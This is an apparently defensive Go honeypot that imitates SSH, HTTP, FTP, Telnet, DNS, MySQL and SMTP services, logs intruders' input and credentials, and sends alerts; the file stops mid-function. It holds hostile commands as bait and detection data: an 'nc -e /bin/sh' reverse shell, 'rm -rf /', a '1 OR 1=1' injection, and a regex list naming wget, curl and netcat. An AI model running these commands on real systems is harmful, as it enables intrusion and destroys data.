package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/netutil"
)

var (
	attempts = make(map[string]int)
	stats    = make(map[string]struct {
		Connections  int
		LastSeen     time.Time
		BlockedUntil time.Time
		GeoLocation  string
	})
	mu             sync.Mutex
	config         Config
	fakeFilesystem = map[string]string{
		"/etc/passwd":        "root:x:0:0:root:/root:/bin/bash\nfakeuser:x:1000:1000::/home/fake:/bin/sh\nadmin:x:1001:1001:,,,:/home/admin:/bin/bash",
		"/etc/hostname":      "honeypot-server",
		"/etc/shadow":        "root:$6$abc123:18745:0:99999:7:::\nfakeuser:$1$xyz789:18745:0:99999:7:::",
		"/var/log/auth.log":  "Mar 22 12:00:01 honeypot sshd[1234]: Failed password for root from 192.168.1.1 port 54321 ssh2",
		"/home/fake/.bashrc": "alias ls='echo dir not found'\nexport PS1='fake@honeypot:~$ '",
		"/secrets.txt":       "API_KEY=FAKE123456789\nDB_PASS=weakpass",
	}
	logEntries []LogEntry
	fakeDNS    = map[string]string{
		"fake.com":       "10.0.0.1",
		"admin.honeypot": "172.16.0.1",
	}
)

type Config struct {
	Ports          map[string]string `json:"ports"`
	MaxConnections int               `json:"max_connections"`
	DiscordWebhook string            `json:"discord_webhook"`
	SIEMEndpoint   string            `json:"siem_endpoint,omitempty"`
}

type LogEntry struct {
	Timestamp   string `json:"timestamp"`
	ClientAddr  string `json:"client_addr"`
	Protocol    string `json:"protocol"`
	Event       string `json:"event"`
	Data        string `json:"data,omitempty"`
	Duration    string `json:"duration,omitempty"`
	Attempts    int    `json:"attempts,omitempty"`
	GeoLocation string `json:"geo_location,omitempty"`
}

func main() {
	loadConfig()
	loadStats()
	semaphore := make(chan struct{}, config.MaxConnections)

	for protocol, port := range config.Ports {
		go startListener("tcp", port, getHandler(protocol), protocol, semaphore)
	}

	go saveStatsPeriodically()
	go startWebServer()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	<-sigChan
	fmt.Println("Arrêt du honeypot...")
}

func loadConfig() {
	configFile, err := os.ReadFile("config.json")
	if err != nil {
		log.Println("Erreur lecture config.json, utilisation config par défaut:", err)
		config = Config{
			Ports: map[string]string{
				"SSH":    "2222",
				"HTTP":   "8080",
				"FTP":    "21",
				"Telnet": "23",
				"DNS":    "5353",
				"MySQL":  "3306",
				"SMTP":   "2525",
			},
			MaxConnections: 50,
			DiscordWebhook: "",
			SIEMEndpoint:   "",
		}
		return
	}
	if err := json.Unmarshal(configFile, &config); err != nil {
		log.Fatalf("Erreur parsing config.json: %v", err)
	}
}

func loadStats() {
	data, err := os.ReadFile("stats.json")
	if err != nil {
		log.Println("Erreur lecture stats.json:", err)
		return
	}
	if err := json.Unmarshal(data, &stats); err != nil {
		log.Println("Erreur parsing stats.json:", err)
	}
}

func startListener(proto, port string, handler func(net.Conn, *log.Logger), protocolName string, semaphore chan struct{}) {
	listener, err := net.Listen(proto, ":"+port)
	if err != nil {
		log.Fatalf("Erreur écoute %s:%s : %v (sudo requis pour < 1024)", protocolName, port, err)
	}
	defer listener.Close()

	logFile, err := os.OpenFile("honeypot.json", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("Erreur fichier log : %v", err)
	}
	defer logFile.Close()

	logger := log.New(logFile, "", 0)
	fmt.Printf("%s démarré sur le port %s...\n", protocolName, port)

	listener = netutil.LimitListener(listener, config.MaxConnections)
	for {
		semaphore <- struct{}{}
		conn, err := listener.Accept()
		if err != nil {
			logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), Protocol: protocolName, Event: "accept_error", Data: fmt.Sprintf("Erreur: %v", err)}
			logJSON(logger, logEntry)
			<-semaphore
			continue
		}
		fmt.Printf("Connexion acceptée %s sur %s\n", conn.RemoteAddr().String(), protocolName)
		go func() {
			defer func() { <-semaphore }()
			handler(conn, logger)
		}()
	}
}

func getHandler(protocol string) func(net.Conn, *log.Logger) {
	switch protocol {
	case "SSH":
		return handleSSHConnection
	case "HTTP":
		return handleHTTPConnection
	case "FTP":
		return handleFTPConnection
	case "Telnet":
		return handleTelnetConnection
	case "DNS":
		return handleDNSConnection
	case "MySQL":
		return handleMySQLConnection
	case "SMTP":
		return handleSMTPConnection
	default:
		return func(conn net.Conn, logger *log.Logger) { conn.Close() }
	}
}

func handleSSHConnection(conn net.Conn, logger *log.Logger) {
	defer conn.Close()

	clientAddr := conn.RemoteAddr().String()
	startTime := time.Now()

	if !updateAttempts(clientAddr, logger, "SSH") {
		return
	}

	logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "SSH", Event: "connection", GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)

	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
	banner := "SSH-2.0-OpenSSH_7.4p1 Vulnerable\r\n"
	prompt := "fake@honeypot:~$ "
	conn.Write([]byte(banner))
	conn.Write([]byte(prompt))

	buffer := make([]byte, 1024)
	for {
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		n, err := conn.Read(buffer)
		if err != nil {
			logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "SSH", Event: "disconnection", Data: fmt.Sprintf("Erreur: %v", err), Duration: time.Since(startTime).String(), GeoLocation: getGeoIP(clientAddr)}
			logJSON(logger, logEntry)
			break
		}

		data := strings.TrimSpace(string(buffer[:n]))
		logRawPayload(clientAddr, data)
		if data == "" {
			continue
		}

		logEntry = LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "SSH", Event: "data_received", Data: data, GeoLocation: getGeoIP(clientAddr)}
		logJSON(logger, logEntry)

		if detectAttack(data) {
			logEntry.Event = "attack_detected"
			logJSON(logger, logEntry)
			notifyAttack(clientAddr, data)
		}

		switch strings.ToLower(data) {
		case "whoami":
			conn.Write([]byte("fake\r\n"))
		case "id":
			conn.Write([]byte("uid=1000(fake) gid=1000(fake)\r\n"))
		case "ls":
			conn.Write([]byte("command not found\r\n"))
		case "dir":
			conn.Write([]byte("passwd  shadow  secrets.txt\r\n"))
		case "cat /etc/passwd":
			conn.Write([]byte(fakeFilesystem["/etc/passwd"] + "\r\n"))
		case "cat /etc/shadow":
			conn.Write([]byte(fakeFilesystem["/etc/shadow"] + "\r\n"))
		case "cat /var/log/auth.log":
			conn.Write([]byte(fakeFilesystem["/var/log/auth.log"] + "\r\n"))
		case "cat /home/fake/.bashrc":
			conn.Write([]byte(fakeFilesystem["/home/fake/.bashrc"] + "\r\n"))
		case "cat /secrets.txt":
			conn.Write([]byte(fakeFilesystem["/secrets.txt"] + "\r\n"))
		case "exit":
			conn.Write([]byte("Goodbye\r\n"))
			return
		case "exploit":
			conn.Write([]byte("Segmentation fault (core dumped)\r\n"))
			logEntry.Event = "exploit_attempt"
			logJSON(logger, logEntry)
			notifyAttack(clientAddr, "Tentative d'exploit SSH")
		case "nc -e /bin/sh 1.2.3.4 4444":
			conn.Write([]byte("Connection established to 1.2.3.4:4444\r\n"))
			notifyAttack(clientAddr, "Reverse shell attempt to 1.2.3.4:4444")
		case "rm -rf /":
			conn.Write([]byte("Files encrypted! Send 1 BTC to 1FakeBitcoinAddress\r\n"))
			notifyAttack(clientAddr, "Ransomware simulation triggered")
		default:
			conn.Write([]byte(fmt.Sprintf("bash: %s: command not found\r\n", data)))
		}
		conn.Write([]byte(prompt))
	}

	go resetAttempts(clientAddr)
}

func handleHTTPConnection(conn net.Conn, logger *log.Logger) {
	defer conn.Close()

	clientAddr := conn.RemoteAddr().String()
	startTime := time.Now()

	if !updateAttempts(clientAddr, logger, "HTTP") {
		return
	}

	logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "HTTP", Event: "connection", GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)

	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
	response := "HTTP/1.1 200 OK\r\n" +
		"Server: Apache/2.2.3 (Vulnerable)\r\n" +
		"Content-Type: text/html\r\n" +
		"Connection: close\r\n\r\n" +
		`<html>
			<head>
				<title>Admin Login</title>
				<style>
					body { background: #1a1a1a; color: #fff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
					.container { background: #2a2a2a; padding: 40px; border-radius: 10px; box-shadow: 0 0 20px rgba(255, 0, 0, 0.5); text-align: center; }
					h1 { color: #ff4444; font-size: 2em; margin-bottom: 20px; }
					input[type="text"], input[type="password"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ff4444; border-radius: 5px; background: #333; color: #fff; }
					input[type="submit"] { background: #ff4444; color: #fff; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
					input[type="submit"]:hover { background: #cc3333; }
					p { color: #aaa; font-size: 0.9em; }
				</style>
			</head>
			<body>
				<div class="container">
					<h1>Admin Login</h1>
					<form method="POST">
						<input name="user" placeholder="admin"/>
						<input type="password" name="pass"/>
						<input type="submit" value="Login"/>
					</form>
					<p>Hint: password is weak123</p>
				</div>
			</body>
		</html>`
	conn.Write([]byte(response))

	buffer := make([]byte, 1024)
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	n, err := conn.Read(buffer)
	if err == nil {
		data := strings.TrimSpace(string(buffer[:n]))
		logRawPayload(clientAddr, data)
		logEntry = LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "HTTP", Event: "data_received", Data: data, GeoLocation: getGeoIP(clientAddr)}
		logJSON(logger, logEntry)
		if strings.Contains(data, "POST") {
			creds := extractCredentials(data)
			if creds != "" {
				logEntry.Event = "credentials"
				logEntry.Data = creds
				logJSON(logger, logEntry)
				notifyAttack(clientAddr, creds)
				if strings.Contains(creds, "admin") && strings.Contains(creds, "weak123") {
					conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" +
						`<html><body style="background: #1a1a1a; color: #fff; text-align: center; padding-top: 50px;">
							<h1 style="color: #ff4444;">Welcome Admin</h1>
							<p>API_KEY=FAKE123456789</p>
						</body></html>`))
				} else {
					conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n" +
						`<html><body style="background: #1a1a1a; color: #fff; text-align: center; padding-top: 50px;">
							<h1 style="color: #ff4444;">Access Denied</h1>
						</body></html>`))
				}
			}
		}
	}

	logEntry = LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "HTTP", Event: "disconnection", Duration: time.Since(startTime).String(), GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)
}

func handleFTPConnection(conn net.Conn, logger *log.Logger) {
	defer conn.Close()

	clientAddr := conn.RemoteAddr().String()
	startTime := time.Now()

	if !updateAttempts(clientAddr, logger, "FTP") {
		return
	}

	logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "FTP", Event: "connection", GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)

	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
	conn.Write([]byte("220 Welcome to Vulnerable FTP Server\r\n"))

	var username string
	buffer := make([]byte, 1024)
	for {
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		n, err := conn.Read(buffer)
		if err != nil {
			logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "FTP", Event: "disconnection", Data: fmt.Sprintf("Erreur: %v", err), Duration: time.Since(startTime).String(), GeoLocation: getGeoIP(clientAddr)}
			logJSON(logger, logEntry)
			break
		}

		data := strings.TrimSpace(string(buffer[:n]))
		logRawPayload(clientAddr, data)
		if data == "" {
			continue
		}

		logEntry = LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "FTP", Event: "data_received", Data: data, GeoLocation: getGeoIP(clientAddr)}
		logJSON(logger, logEntry)

		if strings.HasPrefix(strings.ToUpper(data), "USER") {
			username = strings.TrimSpace(strings.TrimPrefix(data, "USER"))
			conn.Write([]byte("331 Password required\r\n"))
		} else if strings.HasPrefix(strings.ToUpper(data), "PASS") {
			password := strings.TrimSpace(strings.TrimPrefix(data, "PASS"))
			conn.Write([]byte("230 Logged in\r\n"))
			logEntry.Event = "credentials"
			logEntry.Data = fmt.Sprintf("user:%s pass:%s", username, password)
			logJSON(logger, logEntry)
			notifyAttack(clientAddr, logEntry.Data)
		} else if strings.ToUpper(data) == "LIST" {
			conn.Write([]byte("150 Here comes the directory listing.\r\npasswd  shadow  secrets.txt\r\n226 Directory send OK.\r\n"))
		} else if strings.HasPrefix(strings.ToUpper(data), "RETR secrets.txt") {
			conn.Write([]byte("150 Opening data connection.\r\n"))
			conn.Write([]byte(fakeFilesystem["/secrets.txt"] + "\r\n"))
			conn.Write([]byte("226 Transfer complete.\r\n"))
		} else if strings.ToUpper(data) == "QUIT" {
			conn.Write([]byte("221 Goodbye\r\n"))
			break
		} else {
			conn.Write([]byte("500 Command not understood\r\n"))
		}
	}
}

func handleTelnetConnection(conn net.Conn, logger *log.Logger) {
	defer conn.Close()

	clientAddr := conn.RemoteAddr().String()
	startTime := time.Now()

	if !updateAttempts(clientAddr, logger, "Telnet") {
		return
	}

	logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "Telnet", Event: "connection", GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)

	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
	welcome := "Welcome to Vulnerable Telnet Server\r\nLogin: "
	conn.Write([]byte(welcome))

	var username string
	state := "login"
	buffer := make([]byte, 1024)
	for {
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		n, err := conn.Read(buffer)
		if err != nil {
			logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "Telnet", Event: "disconnection", Data: fmt.Sprintf("Erreur: %v", err), Duration: time.Since(startTime).String(), GeoLocation: getGeoIP(clientAddr)}
			logJSON(logger, logEntry)
			break
		}

		data := strings.TrimSpace(string(buffer[:n]))
		logRawPayload(clientAddr, data)
		if data == "" {
			continue
		}

		logEntry = LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "Telnet", Event: "data_received", Data: data, GeoLocation: getGeoIP(clientAddr)}
		logJSON(logger, logEntry)

		if state == "login" {
			username = data
			conn.Write([]byte("Password: "))
			state = "password"
		} else if state == "password" {
			logEntry.Event = "credentials"
			logEntry.Data = fmt.Sprintf("user:%s pass:%s", username, data)
			logJSON(logger, logEntry)
			notifyAttack(clientAddr, logEntry.Data)
			conn.Write([]byte("Login failed\r\n"))
			break
		}
	}
}

func handleDNSConnection(conn net.Conn, logger *log.Logger) {
	defer conn.Close()

	clientAddr := conn.RemoteAddr().String()
	startTime := time.Now()

	if !updateAttempts(clientAddr, logger, "DNS") {
		return
	}

	logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "DNS", Event: "connection", GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)

	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)
	buffer := make([]byte, 512)
	n, err := conn.Read(buffer)
	if err != nil {
		logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "DNS", Event: "read_error", Data: fmt.Sprintf("Erreur: %v", err), Duration: time.Since(startTime).String(), GeoLocation: getGeoIP(clientAddr)}
		logJSON(logger, logEntry)
		return
	}

	data := string(buffer[:n])
	logRawPayload(clientAddr, data)
	domain := extractDNSDomain(buffer[:n])
	ip, ok := fakeDNS[domain]
	if !ok {
		ip = "0.0.0.0"
	}
	response := buildDNSResponse(buffer[:n], ip)
	conn.Write(response)

	logEntry = LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "DNS", Event: "query", Data: domain, Duration: time.Since(startTime).String(), GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)
}

func handleMySQLConnection(conn net.Conn, logger *log.Logger) {
	defer conn.Close()

	clientAddr := conn.RemoteAddr().String()
	startTime := time.Now()

	if !updateAttempts(clientAddr, logger, "MySQL") {
		return
	}

	logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "MySQL", Event: "connection", GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)

	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond) // Latence
	conn.Write([]byte("\x0a5.5.5-10.1.1-MariaDB\x00\x01\x00\x00\x00fake\x00"))

	buffer := make([]byte, 1024)
	for {
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		n, err := conn.Read(buffer)
		if err != nil {
			logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "MySQL", Event: "disconnection", Data: fmt.Sprintf("Erreur: %v", err), Duration: time.Since(startTime).String(), GeoLocation: getGeoIP(clientAddr)}
			logJSON(logger, logEntry)
			break
		}

		data := strings.TrimSpace(string(buffer[:n]))
		logRawPayload(clientAddr, data) // Payload brut
		if data == "" {
			continue
		}

		logEntry = LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "MySQL", Event: "data_received", Data: data, GeoLocation: getGeoIP(clientAddr)}
		logJSON(logger, logEntry)

		if strings.Contains(strings.ToUpper(data), "SELECT") {
			notifyAttack(clientAddr, "Tentative SQL: "+data)
			conn.Write([]byte("admin\tweakpass\r\n"))
		}
	}
}

func handleSMTPConnection(conn net.Conn, logger *log.Logger) {
	defer conn.Close()

	clientAddr := conn.RemoteAddr().String()
	startTime := time.Now()

	if !updateAttempts(clientAddr, logger, "SMTP") {
		return
	}

	logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "SMTP", Event: "connection", GeoLocation: getGeoIP(clientAddr)}
	logJSON(logger, logEntry)

	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond) // Latence
	conn.Write([]byte("220 fake.smtp.server ESMTP\r\n"))

	buffer := make([]byte, 1024)
	for {
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		n, err := conn.Read(buffer)
		if err != nil {
			logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "SMTP", Event: "disconnection", Data: fmt.Sprintf("Erreur: %v", err), Duration: time.Since(startTime).String(), GeoLocation: getGeoIP(clientAddr)}
			logJSON(logger, logEntry)
			break
		}

		data := strings.TrimSpace(string(buffer[:n]))
		logRawPayload(clientAddr, data)
		if data == "" {
			continue
		}

		logEntry = LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: "SMTP", Event: "data_received", Data: data, GeoLocation: getGeoIP(clientAddr)}
		logJSON(logger, logEntry)

		if strings.HasPrefix(strings.ToUpper(data), "EHLO") {
			conn.Write([]byte("250 Hello\r\n"))
			notifyAttack(clientAddr, "SMTP EHLO: "+data)
		} else if strings.HasPrefix(strings.ToUpper(data), "MAIL FROM") {
			conn.Write([]byte("250 OK\r\n"))
			notifyAttack(clientAddr, "SMTP MAIL FROM: "+data)
		} else if strings.HasPrefix(strings.ToUpper(data), "RCPT TO") {
			conn.Write([]byte("250 OK\r\n"))
			notifyAttack(clientAddr, "SMTP RCPT TO: "+data)
		} else if strings.ToUpper(data) == "QUIT" {
			conn.Write([]byte("221 Bye\r\n"))
			break
		} else {
			conn.Write([]byte("500 Command not recognized\r\n"))
		}
	}
}

func updateAttempts(clientAddr string, logger *log.Logger, protocol string) bool {
	mu.Lock()
	defer mu.Unlock()
	attempts[clientAddr]++
	geo := getGeoIP(clientAddr)
	stats[clientAddr] = struct {
		Connections  int
		LastSeen     time.Time
		BlockedUntil time.Time
		GeoLocation  string
	}{Connections: stats[clientAddr].Connections + 1, LastSeen: time.Now(), BlockedUntil: stats[clientAddr].BlockedUntil, GeoLocation: geo}
	if attempts[clientAddr] > 5 {
		logEntry := LogEntry{Timestamp: time.Now().Format(time.RFC3339), ClientAddr: clientAddr, Protocol: protocol, Event: "brute_force_detected", Attempts: attempts[clientAddr], GeoLocation: geo}
		logJSON(logger, logEntry)
		stats[clientAddr] = struct {
			Connections  int
			LastSeen     time.Time
			BlockedUntil time.Time
			GeoLocation  string
		}{Connections: stats[clientAddr].Connections, LastSeen: stats[clientAddr].LastSeen, BlockedUntil: time.Now().Add(5 * time.Minute), GeoLocation: geo}
		return false
	}
	if !stats[clientAddr].BlockedUntil.IsZero() && time.Now().Before(stats[clientAddr].BlockedUntil) {
		return false
	}
	return true
}

func logJSON(logger *log.Logger, entry LogEntry) {
	jsonData, err := json.Marshal(entry)
	if err != nil {
		log.Printf("Erreur marshal log entry: %v", err)
		return
	}

	mu.Lock()
	if len(logEntries) > 500 {
		logEntries = logEntries[250:]
	}
	logEntries = append(logEntries, entry)
	mu.Unlock()

	logger.Println(string(jsonData))
	fmt.Printf("Log: %s\n", string(jsonData))
	if config.SIEMEndpoint != "" {
		go sendToSIEM(entry)
	}
}

func resetAttempts(addr string) {
	time.Sleep(5 * time.Minute)
	mu.Lock()
	delete(attempts, addr)
	mu.Unlock()
}

func detectAttack(data string) bool {
	patterns := []string{`(?i)select.*from`, `(?i)wget|curl`, `(?i)nc|netcat`, `(?i)exploit`, `(?i)rootkit`, `(?i)shell`, `(?i)rm -rf`}
	for _, pattern := range patterns {
		if matched, err := regexp.MatchString(pattern, data); err == nil && matched {
			return true
		}
	}
	return false
}

func notifyAttack(clientAddr, data string) {
	geo := getGeoIP(clientAddr)
	if geo == "Unknown" {
		log.Printf("Attention: géolocalisation échouée pour %s", clientAddr)
	}
	alert := fmt.Sprintf("ALERTE [%s]: Attaque depuis %s (%s) - %s", time.Now().Format(time.RFC3339), clientAddr, geo, data)
	fmt.Println(alert)
	go sendDiscordAlert(alert)
}

func sendDiscordAlert(alert string) {
	if config.DiscordWebhook == "" {
		log.Println("Webhook Discord non configuré, alerte non envoyée")
		return
	}

	payload := map[string]string{"content": alert}
	jsonData, err := json.Marshal(payload)
	if err != nil {
		log.Printf("Erreur marshal payload Discord: %v", err)
		return
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(config.DiscordWebhook, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("Erreur envoi alerte Discord: %v", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent {
		log.Printf("Erreur réponse Discord: %s", resp.Status)
	}
}

func sendToSIEM(entry LogEntry) {
	if config.SIEMEndpoint == "" {
		log.Println("Endpoint SIEM non configuré, log non envoyé")
		return
	}

	jsonData, err := json.Marshal(entry)
	if err != nil {
		log.Printf("Erreur marshal log SIEM: %v", err)
		return
	}

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(config.SIEMEndpoint, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("Erreur envoi log SIEM: %v", err)
		return
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		log.Printf("Erreur réponse SIEM: %s", resp.Status)
	}
}

func logRawPayload(clientAddr, data string) {
	f, err := os.OpenFile("payloads.bin", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("Erreur écriture payloads.bin: %v", err)
		return
	}
	defer f.Close()
	if _, err := f.WriteString(fmt.Sprintf("%s [%s]: %s\n", time.Now().Format(time.RFC3339), clientAddr, data)); err != nil {
		log.Printf("Erreur écriture données dans payloads.bin: %v", err)
	}
}

func saveStatsPeriodically() {
	for {
		time.Sleep(1 * time.Minute)
		mu.Lock()
		data, err := json.Marshal(stats)
		if err != nil {
			log.Printf("Erreur marshal stats: %v", err)
			mu.Unlock()
			continue
		}
		if err := os.WriteFile("stats.json", data, 0644); err != nil {
			log.Printf("Erreur écriture stats.json: %v", err)
		}
		mu.Unlock()
	}
}

func startWebServer() {
	var upgrader = websocket.Upgrader{}

	http.HandleFunc("/api/users", func(w http.ResponseWriter, r *http.Request) {
		time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond) // Latence
		if r.URL.Query().Get("id") == "1 OR 1=1" {
			notifyAttack(r.RemoteAddr, "SQLi attempt on /api/users")
			w.Write([]byte(`[{"id":1,"name":"admin","pass":"weak123"}]`))
		} else {
			w.Write([]byte(`[{"id":1,"name":"guest"}]`))
		}
	})

	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			log.Printf("Erreur WebSocket upgrade: %v", err)
			return
		}
		defer conn.Close()
		for {
			mu.Lock()
			if len(logEntries) > 0 {
				data, err := json.Marshal(logEntries[len(logEntries)-1])
				if err != nil {
					log.Printf("Erreur marshal log WebSocket: %v", err)
					mu.Unlock()
					continue
				}
				if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
					log.Printf("Erreur écriture WebSocket: %v", err)
					mu.Unlock()
					break
				}
			}
			mu.Unlock()
			time.Sleep(1 * time.Second)
		}
	})

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		tmpl := template.Must(template.New("index").Parse(`
		<html>
		<head>
			<title>Honeypot Live Dashboard</title>
			<style>
				body { background: linear-gradient(135deg, #1a1a1a, #2a2a2a); color: #fff; font-family: 'Arial', sans-serif; margin: 0; padding: 20px; }
				.container { max-width: 1200px; margin: 0 auto; }
				h1 { color: #ff4444; text-align: center; font-size: 2.5em; text-shadow: 0 0 10px rgba(255, 68, 68, 0.8); }
				.stats { background: #333; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); margin-bottom: 20px; }
				.stats h2 { color: #ff6666; margin-top: 0; }
				.stats ul { list-style: none; padding: 0; }
				.stats li { padding: 10px; border-bottom: 1px solid #444; }
				#logs { background: #222; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.5); max-height: 400px; overflow-y: auto; }
				#logs li { padding: 5px 0; border-bottom: 1px solid #333; }
				#connChart { background: #333; padding: 20px; border-radius: 10px; margin-top: 20px; }
				a { display: inline-block; margin-top: 20px; padding: 10px 20px; background: #ff4444; color: #fff; text-decoration: none; border-radius: 5px; }
				a:hover { background: #cc3333; }
			</style>
			<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
			<script>
				var ws = new WebSocket("ws://localhost:9090/ws");
				var chartData = { labels: [], datasets: [{ label: 'Connexions', data: [], borderColor: '#ff4444', fill: false }] };
				var chart = new Chart(document.getElementById('connChart').getContext('2d'), {
					type: 'line',
					data: chartData,
					options: { scales: { y: { beginAtZero: true } } }
				});
				ws.onmessage = function(e) {
					var log = JSON.parse(e.data);
					var li = document.createElement("li");
					li.textContent = log.timestamp + " - " + log.client_addr + " (" + log.protocol + ")" + (log.geo_location ? " [" + log.geo_location + "]" : "") + ": " + log.event + (log.data ? " - " + log.data : "");
					document.getElementById("logs").appendChild(li);
					chartData.labels.push(log.timestamp.slice(11, 19));
					chartData.datasets[0].data.push(1);
					if (chartData.labels.length > 20) {
						chartData.labels.shift();
						chartData.datasets[0].data.shift();
					}
					chart.update();
				};
			</script>
		</head>
		<body>
			<div class="container">
				<h1>Honeypot Live Dashboard</h1>
				<div class="stats">
					<h2>Statistiques</h2>
					<ul>
						{{range $ip, $stat := .Stats}}
							<li>{{$ip}} [{{$stat.GeoLocation}}]: {{$stat.Connections}} connexions (Dernière: {{$stat.LastSeen}})</li>
						{{end}}
					</ul>
				</div>
				<h2>Logs en temps réel</h2>
				<ul id="logs"></ul>
				<canvas id="connChart" height="100"></canvas>
				<a href="/export">Exporter logs en CSV</a>
			</div>
		</body>
		</html>`))

		mu.Lock()
		data := struct {
			Stats map[string]struct {
				Connections            int
				LastSeen, BlockedUntil time.Time
				GeoLocation            string
			}
			Logs []LogEntry
		}{
			Stats: stats,
			Logs:  append([]LogEntry{}, logEntries[:min(100, len(logEntries))]...),
		}
		mu.Unlock()

		w.Header().Set("Content-Type", "text/html")
		if err := tmpl.Execute(w, data); err != nil {
			log.Printf("Erreur rendu dashboard: %v", err)
			http.Error(w, "Erreur rendu", http.StatusInternalServerError)
		}
	})

	http.HandleFunc("/export", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", "attachment;filename=honeypot_logs.csv")
		if _, err := w.Write([]byte("Timestamp,ClientAddr,Protocol,Event,Data,GeoLocation\n")); err != nil {
			log.Printf("Erreur écriture CSV: %v", err)
			return
		}
		mu.Lock()
		for _, entry := range logEntries {
			if _, err := fmt.Fprintf(w, "%s,%s,%s,%s,%s,%s\n", entry.Timestamp, entry.ClientAddr, entry.Protocol, entry.Event, entry.Data, entry.GeoLocation); err != nil {
				log.Printf("Erreur écriture ligne CSV: %v", err)
				break
			}
		}
		mu.Unlock()
	})

	fmt.Println("Démarrage serveur web sur :9090")
	if err := http.ListenAndServe(":9090", nil); err != nil {
		log.Fatalf("Erreur démarrage web: %v", err)
	}
}

func extractDNSDomain(packet []byte) string {
	if len(packet) < 12 {
		return ""
	}
	pos := 12
	var domain strings.Builder
	for pos < len(packet) && packet[pos] != 0 {
		length := int(packet[pos])
		pos++
		if pos+length > len(packet) {
			break
		}
